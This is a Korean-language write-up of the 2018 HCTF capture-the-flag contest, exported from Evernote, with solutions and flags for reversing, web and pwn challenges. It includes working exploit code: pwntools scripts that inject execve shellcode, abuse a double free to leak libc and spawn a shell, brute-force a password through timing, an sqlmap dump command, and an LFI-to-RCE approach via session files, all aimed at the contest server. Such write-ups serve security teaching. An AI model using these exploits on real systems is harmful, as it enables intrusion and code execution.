<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 7.6 (457299)"/><meta name="author" content="delsponn@gmail.com"/><meta name="created" content="2018-11-24 12:25:39 +0000"/><meta name="source" content="desktop.mac"/><meta name="updated" content="2018-11-24 13:45:09 +0000"/><title>2018 HCTF Write-up</title></head><body><div><span style="font-weight: bold;"><font style="font-size: 24px;"># 2018 HCTF Write-up</font></span></div><div><br/></div><div>author : 조성준</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/F01C62D0-B7F7-4CB1-B899-6BEBA1A67531.png" height="1702" width="2326"/></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/A08AD168-ABA0-4DBA-88DB-29CED3A3A361.png" height="740" width="2196"/></div><div><br/></div><div><b><font style="font-size: 18px;">## </font></b><span style="font-weight: bold; font-size: 18px;">Problems </span><b><font style="font-size: 18px;">Backup</font></b></div><div><br/></div><div><a href="2018%20HCTF%20Write-up.resources/DecompileME.apk">DecompileME.apk</a></div><div><a href="2018%20HCTF%20Write-up.resources/equation">equation</a></div><div><a href="2018%20HCTF%20Write-up.resources/script">script</a></div><div><a href="2018%20HCTF%20Write-up.resources/admin">admin</a></div><div><a href="2018%20HCTF%20Write-up.resources/bf.c">bf.c</a></div><div><a href="2018%20HCTF%20Write-up.resources/memo.zip">memo.zip</a></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## rev_DecompileME</font></span></div><div><br/></div><div>apk 파일이 주어졌다. 일단 압축을 해제했다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/468E7174-C449-4357-8E3F-62DB211AC57B.png" height="124" width="549"/><br/></div><div><br/></div><div>의도된 풀이가 무엇인지 모르겠지만 왠지 굉장히 쉬운 문제일 것 같아서 FLAG를 검색해봤는데 플래그가 튀어나왔다.</div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>FLAG{Trust_th1s_5tr1ng}</div></div><div><br/></div><div><span style="font-weight: bold;">## rev_equation</span></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/CACFF984-90D9-4B2B-AB7D-AE281A5F4C0A.png" height="1448" width="820"/><br/></div><div><br/></div><div>위 필터링을 모두 통과하면 된다. z3 솔버를 이용하여 플래그를 구했다.</div><div><br/></div><div><span style="font-weight: bold;">### Solution Code</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>from z3 import *</div><div><br/></div><div>s = Solver()</div><div><br/></div><div>a = []</div><div>for i in range(20):</div><div>    a.append(Int('a['+str(i)+']'))</div><div>    s.add(a[i]&gt;=0)</div><div>    s.add(a[i]&lt;10)</div><div><br/></div><div>s.add(a[15] + a[4] == 10)</div><div>s.add(a[1] * a[18] == 2)</div><div>s.add(a[17] - a[0] == 4)</div><div>s.add(a[5] - a[17] == -1)</div><div>s.add(a[15] - a[1] == 5)</div><div>s.add(a[1] * a[10] == 18)</div><div>s.add(a[8] + a[13] == 14)</div><div>s.add(a[18] * a[8] == 5)</div><div>s.add(a[4] * a[11] == 0)</div><div>s.add(a[8] + a[9] == 12)</div><div>s.add(a[12] - a[19] == 1)</div><div><br/></div><div>s.add(a[9] % a[17] == 7)</div><div><br/></div><div>s.add(a[14] * a[16] == 40)</div><div>s.add(a[7] - a[4] == 1)</div><div>s.add(a[6] + a[0] == 6)</div><div>s.add(a[2] - a[16] == 0)</div><div>s.add(a[4] - a[6] == 1)</div><div><br/></div><div>s.add(a[0] % a[5] == 4)</div><div><br/></div><div>s.add(a[5] * a[11] == 0)</div><div><br/></div><div>s.add(a[10] % a[15] == 2)</div><div><br/></div><div>s.add(a[11] + a[3] == 9)</div><div>s.add(a[14] - a[13] == -4)</div><div>s.add(a[18] + a[19] == 4)</div><div><br/></div><div>print s.check()</div><div><br/></div><div>flag = []</div><div>for i in range(20):</div><div>    flag.append('')</div><div><br/></div><div>m = s.model()</div><div>for d in m.decls():</div><div>    flag[int(d.name()[2:-1])] = str(m[d])</div><div>print "".join(flag)</div></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/F1279D50-97D1-4EAD-8D24-74CBA8425F1C.png" height="100" width="435"/><br/></div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>42893724579049578813</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## rev_script</font></span></div><div><br/></div><div>IDA 기능을 이용하여 pseudo code를 파일로 저장한 후 다음 내용을 파싱하여 문제를 해결했다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/81526CFB-58DF-428F-A11F-538E535079B4.png" height="564" width="774"/><br/></div><div><br/></div><div>해당 내용을 모두 뽑으면 다음 문자열이 나타난다.</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>DLLAR DOLLARH</div><div>I used it all up in a dayC</div><div>Run run I earn and I splurgeT</div><div>Run run run runF</div><div>Run run{</div><div>I want it, cruisin on the bayG</div><div>I want it, cruisin like NEMO0</div><div>I dont have money but I wanna go somewhere far away_</div><div>I dont have money but I want to destressM</div><div>I dont have money but I wanna eat at Jiro Onos4</div><div>I worked so hard and earned my payC</div><div>All of it, into my tummy4</div><div>I collect every drop and have fun wasting every drop, I spend it allU</div><div>Let me be, even though I overspend_</div><div>Tomorrow morning, I may act crazyF</div><div>And withdraw installment savings0</div><div>WOO theres no tomorrowR</div><div>Theres already a mortgage on my future_</div><div>WOO I spend more of my moneyT</div><div>Friends wussup4</div><div>Do you want some?N</div><div>DOLLAR DOLLARG</div><div>I spend it all in a dayJ</div><div>Run, run man i spend it like some partyI</div><div>DOLLAR DOLLARN</div><div>Until every dog has his dayJ</div><div>Until the sun risesA</div><div>YOLO YOLO YOLO YOM</div><div>YOLO YOLO YO_</div><div>Spend spend spendT</div><div>YOLO YOLO YOLO YO4</div><div>Where my money yahN</div><div>Spend spend spendG</div><div>YOLO YOLO YOLO YOJ</div><div>YOLO YOLO YOI</div><div>Spend spend spendN</div><div>YOLO YOLO YOLO YOJ</div><div>Where the party yahA</div><div>Spend spend spendM</div><div>Where my money yah?!</div><div>Where the party yah?}</div></div><div><br/></div><div>라인마다 마지막 글자만 뽑으면 플래그가 나타난다.</div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{G0_M4C4U_F0R_T4NGJINJAM_T4NGJINJAM!}</div></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## web_yuhuiwang</font></span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>sqlmap -u "http://54.180.60.212:8001/?no=1" --dump -D yu_hui_wang -T f14g</div></div><div><br/></div><div>간단한 sql injection 문제이다. DB명, 테이블명을 뽑고 위 명령어를 실행하면 플래그가 나타난다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/D2E258F5-BE8E-45F3-9394-9F5CCEB26314.png" height="987" width="864"/><br/></div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{T0night's_ma1n_char4cter_i5_me}</div></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## pwn_admin</font></span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>from pwn import *</div><div>import sys</div><div><br/></div><div>#context(log_level='DEBUG')</div><div><br/></div><div>def main():</div><div>  if len(sys.argv) == 1:</div><div>    p = process('./admin')</div><div>  else:</div><div>    p = remote("54.180.60.212", 1001)</div><div><br/></div><div>  shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</div><div><br/></div><div>  payload = p64(0x601120)</div><div><br/></div><div>  p.sendlineafter('&gt;', '1')</div><div>  p.sendafter('ID: ', shellcode)</div><div>  p.sendafter('Password: ', payload)</div><div>  p.sendlineafter('&gt;', '-8')</div><div>  p.interactive()</div><div><br/></div><div>if __name__ == '__main__':</div><div>  main()</div></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/BC9B1265-3729-4037-9A7C-CCC9D14F1548.png" height="616" width="1000"/></div><div><br/></div><div>전역 변수 fptr를 통해 메뉴 함수가 관리된다. option 값을 입력 받아서 맞는 메뉴의 함수를 호출하는 방식인데 option 값에 음수를 입력하면 Out of Bound를 트리거할 수 있다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/EA04EE31-CEDB-4B90-9561-9E4E967B62B1.png" height="372" width="670"/></div><div><br/></div><div>위에서 입력받는 ID, Password 값도 전역변수로 처리된다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/19E610ED-D1D5-4A01-9C81-1E5944C62607.png" height="326" width="794"/></div><div><br/></div><div>RWX 영역이 있고, 그 영역이 마침 전역변수 영역이다. ID 값에 쉘코드를 적어놓고 Password 값에 ID 포인터를 적어둔 후 OOB를 트리거 하여 익스플로잇하면 된다.</div><div><br/></div><div><span style="font-weight: bold;">### Exploit Code</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>from pwn import *</div><div>import sys</div><div><br/></div><div>#context(log_level='DEBUG')</div><div><br/></div><div>def main():</div><div>  if len(sys.argv) == 1:</div><div>    p = process('./admin')</div><div>  else:</div><div>    p = remote("54.180.60.212", 1001)</div><div><br/></div><div>  shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</div><div><br/></div><div>  payload = p64(0x601120)</div><div><br/></div><div>  p.sendlineafter('&gt;', '1')</div><div>  p.sendafter('ID: ', shellcode)</div><div>  p.sendafter('Password: ', payload)</div><div>  p.sendlineafter('&gt;', '-8')</div><div>  p.interactive()</div><div><br/></div><div>if __name__ == '__main__':</div><div>  main()</div></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/3B329892-05C3-41AB-9260-9D3121B20011.png" height="132" width="478"/><br/></div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{we1c0m3_t0_HCTF}</div></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## pwn_bf</font></span></div><div><br/></div><div>소스코드를 분석해보면 시간을 기준으로 사이드 채널 어택이 가능하다는 것을 알 수 있다.</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>#include&lt;stdio.h&gt;</div><div>#include&lt;unistd.h&gt;</div><div>#include&lt;stdlib.h&gt;</div><div>#include&lt;string.h&gt;</div><div><br/></div><div><br/></div><div>static char origin[0x20] = ""; // Welcome to HCTF! you should find this origin flag!</div><div><br/></div><div><br/></div><div>void init()</div><div>{</div><div>        setvbuf(stdout, NULL, _IONBF, 0);</div><div>        setvbuf(stdin, NULL, _IONBF, 0);</div><div>}</div><div><br/></div><div>int compare(char *pwd)</div><div>{</div><div>        for(int i = 0; strlen(origin); i ++)</div><div>        {</div><div>                sleep(1);</div><div>                if(pwd[i] == origin[i])</div><div>                {</div><div>                        continue;</div><div>                }</div><div>                else</div><div>                {</div><div>                        printf("Wrong Password!\n");</div><div>                        return 0;</div><div>                }</div><div>        }</div><div>        printf("Correct Password!\n");</div><div>}</div><div><br/></div><div><br/></div><div>int main()</div><div>{</div><div>        char password[0x20];</div><div>        init();</div><div>        printf("Input Password [A-Z0-9_{}]\n");</div><div><br/></div><div>        read(0, password, sizeof(password));</div><div><br/></div><div>        compare(password);</div><div>}</div></div><div><br/></div><div>브루트 포싱을 수행하면 된다. 다만 1초의 sleep이 걸려있어 시간을 꽤나 많이 잡아먹은 문제였다.</div><div><br/></div><div><span style="font-weight: bold;">### Solution Code</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>from pwn import *</div><div>import string</div><div><br/></div><div>flag = "HCTF{B0RING_T1M1NG_1SSU3"</div><div><br/></div><div>string.printable = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"</div><div>def is_ok():</div><div>  global p, flag</div><div>  for i in string.printable:</div><div>    p = remote("54.180.60.212", 1002)</div><div>    p.recvline()</div><div>    payload = flag + i</div><div>    start = time.time()</div><div>    p.send(payload)</div><div>    print p.recvuntil("Wrong")</div><div>    end =  time.time()</div><div>    p.close()</div><div><br/></div><div>    print "[%f] tried : %s" % (end-start, payload)</div><div>    if (end - start &gt; len(flag) + 1.5):</div><div>      flag += i</div><div>      print "[+] correct : %s" % flag</div><div>      return 1</div><div>    else:</div><div>      continue</div><div><br/></div><div><br/></div><div>def main():</div><div>  while True:</div><div>    is_ok()</div><div><br/></div><div>if __name__ == '__main__':</div><div>  main()</div><div><br/></div><div># HCTF{B0RING_T1M1NG_1SSU3}</div></div><div><br/></div><div><span style="font-weight: bold;">### Flag</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{B0RING_T1M1NG_1SSU3}</div></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## pwn_memo</font></span></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/47B937AE-78BA-4A6F-86F4-498D0D78D01A.png" height="646" width="1020"/></div><div><br/></div><div>위는 delete 기능의 내용이다. 삭제된 메모를 따로 처리하는 로직이 없다. 이 덕분에 double free를 트리거할 수 있다.</div><div><br/></div><div>메모 구조체에 함수 포인터가 포함된다. double free를 잘 엮어서 이 부분을 덮어씌운 후 함수 호출을 트리거하면 rip를 바꿀 수 있다.</div><div>show 기능에서는 free된 청크에서 내용을 읽어올 수 있으므로 이를 활용하여 leak 하면 된다. PIE가 걸려있기 때문에 heap을 릭한 후 code를 릭하여 libc 주소까지 릭할 수 있었다.</div><div><br/></div><div><b>### Exploit Code</b></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>from pwn import *</div><div>import sys</div><div><br/></div><div>b = ELF("./memo")</div><div><br/></div><div>def add(size, payload):</div><div>  p.sendafter("Exit\n", "1\x00\x00\x00")</div><div>  p.sendlineafter("Size : ", str(size))</div><div>  p.sendafter("memo\n", payload)</div><div><br/></div><div>def delete(idx):</div><div>  p.sendafter("Exit\n", "3\x00\x00\x00")</div><div>  p.sendlineafter("0-", str(idx))</div><div><br/></div><div>def show(idx):</div><div>  p.sendafter("Exit\n", "2\x00\x00\x00")</div><div>  p.sendlineafter("0-", str(idx))</div><div>  p.recv(1)</div><div>  return p.recvline()[:-1]</div><div><br/></div><div>def main():</div><div>  global p</div><div>  if len(sys.argv) == 1:</div><div>    p = process("./memo")</div><div>  else:</div><div>    p = remote("54.180.60.212", 1003)</div><div><br/></div><div>  add(0x1f, "0000")</div><div>  add(0xf, "1111")</div><div>  add(0xf, "2222")</div><div>  delete(0)</div><div>  delete(1)</div><div>  delete(2)</div><div>  delete(0)</div><div><br/></div><div>  add(0x10, "\x18")           # 3</div><div>  leak = u64(show(0).ljust(8, "\x00"))</div><div>  heap = leak - 0x18</div><div>  log.info("leak = 0x%x" % leak)</div><div>  log.info("heap = 0x%x" % heap)</div><div><br/></div><div>  leak = u64(show(2).ljust(8, "\x00"))</div><div>  code = leak - 0xc3e</div><div>  log.info("leak = 0x%x" % leak)</div><div>  log.info("code = 0x%x" % code)</div><div><br/></div><div>  payload = p64(code+b.got['puts'])</div><div>  add(0x10, payload)        # 4</div><div><br/></div><div>  leak = u64(show(1).ljust(8, "\x00"))</div><div>  libc = leak - (0x7ffff7a7c690-0x00007ffff7a0d000)</div><div>  log.info("leak = 0x%x" % leak)</div><div>  log.info("libc = 0x%x" % libc)</div><div><br/></div><div>  payload = p64(0)</div><div>  payload += p64(libc+0x45216)</div><div>  add(0x10, payload)</div><div><br/></div><div>  p.sendafter("Exit\n", "2\x00\x00\x00")</div><div>  p.sendlineafter("0-", "0")</div><div><br/></div><div><br/></div><div>  p.interactive()</div><div><br/></div><div>if __name__ == '__main__':</div><div>  main()</div><div><br/></div><div><br/></div><div>"""</div><div>0x45216    execve("/bin/sh", rsp+0x30, environ)</div><div>constraints:</div><div>  rax == NULL</div><div><br/></div><div>0x4526a    execve("/bin/sh", rsp+0x30, environ)</div><div>constraints:</div><div>  [rsp+0x30] == NULL</div><div><br/></div><div>0xf02a4    execve("/bin/sh", rsp+0x50, environ)</div><div>constraints:</div><div>  [rsp+0x50] == NULL</div><div><br/></div><div>0xf1147    execve("/bin/sh", rsp+0x70, environ)</div><div>constraints:</div><div>  [rsp+0x70] == NULL</div><div>"""</div></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/AAC0CE81-6199-4098-B547-A5BD36F30E89.png" height="694" width="980"/></div><div><br/></div><div><b>### Flag</b></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{FASTB1N_1S_S1mple}</div></div><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 18px;">## web_profile</font></span></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/A1F60845-455F-4BED-8178-AA4DC8913723.png" height="124" width="1288"/></div><div><br/></div><div>php wrapper를 통해 LFI 공격이 가능하다.</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>&lt;?php</div><div>    error_reporting(0);</div><div>    session_start();</div><div><br/></div><div>    if (file_exists($_GET['p'].'.php'))</div><div>        include $_GET['p'].'.php';</div><div>    else if (isset($_GET['p']))</div><div>        include $_GET['p'];</div><div>    else</div><div>        echo '&lt;script&gt;location.href="./?p=create";&lt;/script&gt;';</div><div>?&gt;</div></div><div><br/></div><div>위는 index.php의 내용이다. p에 입력 값을 넣음으로써 서버 내 파일을 include 할 수 있다.</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>&lt;?php</div><div>    // session_start();</div><div><br/></div><div>    if(array_count_values($_POST)){</div><div>        if(isset($_FILES)){</div><div>            $allowed_ext = array('jpg','jpeg','png','gif');</div><div>            $ext = array_pop(explode('.', $_FILES['photo']['name']));</div><div><br/></div><div>            if( !in_array($ext, $allowed_ext) ) {</div><div>                echo "허용되지 않는 확장자입니다. (jpg, jpeg, png, gif)";</div><div>                exit;</div><div>            }</div><div><br/></div><div>            if (@getimagesize($_FILES['photo']['tmp_name']) !== false) {</div><div>                $dest = "user_img/" . md5('jeong.su_'.$_FILES['photo']['tmp_name']) . ".$ext";</div><div>                move_uploaded_file($_FILES['photo']['tmp_name'], $dest);</div><div>            } else {</div><div>                echo "이미지가 아닙니다. ";</div><div>                exit;</div><div>            }</div><div>        }</div><div><br/></div><div>        $_SESSION['name'] = $_POST['name'];</div><div>        $_SESSION['message'] = $_POST['message'];</div><div>        $_SESSION['service'] = $_POST['service'];</div><div>        $_SESSION['email'] = $_POST['email'];</div><div>        $_SESSION['img'] = $dest;</div><div><br/></div><div>        echo '&lt;script&gt;location.href="./?p=view";&lt;/script&gt;';</div><div>        exit;</div><div>    }</div><div>?&gt;</div></div><div><br/></div><div>위는 create.php의 내용 중 일부이다. 여기서 주목해야할 것은 세션 값에 원하는 내용을 넣을 수 있다는 것이다.</div><div><br/></div><div>세션은 파일로 관리되므로 세션 값에 php 코드를 넣어놓고 include 시키면 웹쉘로 연결시킬 수 있다.</div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/BE3B0041-45A9-41A1-8B50-3F9FE21616CE.png" height="1730" width="1026"/></div><div><br/></div><div><img src="2018%20HCTF%20Write-up.resources/49B7C2C4-DB47-4E54-BB83-0D6B568F196A.png" height="864" width="2686"/></div><div><br/></div><div><b>### Flag</b></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;"><div>HCTF{LF1_t0_RCE_exp1oit_i5_Fun!}</div></div><div><br/></div></body></html>